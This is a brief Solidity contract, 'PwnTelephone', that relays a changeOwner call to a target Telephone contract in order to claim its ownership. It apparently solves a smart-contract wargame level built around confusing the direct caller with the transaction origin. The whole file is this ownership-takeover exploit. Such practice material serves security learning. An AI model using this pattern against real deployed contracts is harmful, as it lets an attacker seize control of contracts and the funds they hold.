// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./telephone.sol";

/**
 * @title Pwn Telephone
 * @author Holly Grimm
 * @notice Claim Ownership of Telephone Contract
 */
contract PwnTelephone {
    // @dev Original Telephone Contract
    Telephone private _telephoneContract;

    constructor(address telephoneContractAddress) public {
        _telephoneContract = Telephone(telephoneContractAddress);
    }

    /**
     * @notice Change Owner
     * @param _owner New Owner Address
     */
    function changeOwner(address _owner) public {
        _telephoneContract.changeOwner(_owner);
    }
}
